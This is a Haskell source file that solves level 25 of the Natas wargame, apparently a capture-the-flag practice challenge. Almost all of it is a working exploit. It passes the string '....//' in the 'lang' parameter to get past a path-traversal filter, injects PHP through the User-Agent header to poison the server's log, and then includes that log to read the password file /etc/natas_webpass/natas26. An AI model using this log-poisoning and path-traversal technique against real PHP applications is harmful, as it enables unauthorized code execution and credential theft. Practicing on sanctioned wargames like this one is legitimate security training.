{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas25 where

import           Data.Text          (Text)
import qualified Data.Text          as T
import           Data.Text.Encoding (decodeUtf8, encodeUtf8)
import           Safe               (headMay, lastMay)

import           Network.Wreq       (cookieValue, header, param, responseCookie)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let upDir = "....//"
      targetDir sid = T.concat [upDir, "/logs/natas25_", sid, ".log"]
      injectPhp =
        T.concat
          [ "<? "
          , "echo \"Username: \"; "
          , "readfile(\"/etc/natas_webpass/natas26\"); "
          , "echo \"<br />\" ;"
          , "?>"
          ]
      injectHeader = header "User-Agent" .~ [encodeUtf8 injectPhp]
  req <-
    getLevel'
      25
      (parentUri 25)
      (injectHeader . (param "lang" .~ [targetDir ""]))
  let sessid = req ^. responseCookie "PHPSESSID" . cookieValue
  sreq <-
    getLevel'
      25
      (parentUri 25)
      (param "lang" .~ [targetDir (decodeUtf8 sessid)])
  attemptParse (reqBody sreq)

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = headMay (workupBody' extractPassword body)
  in pure $ match >>= lastMay
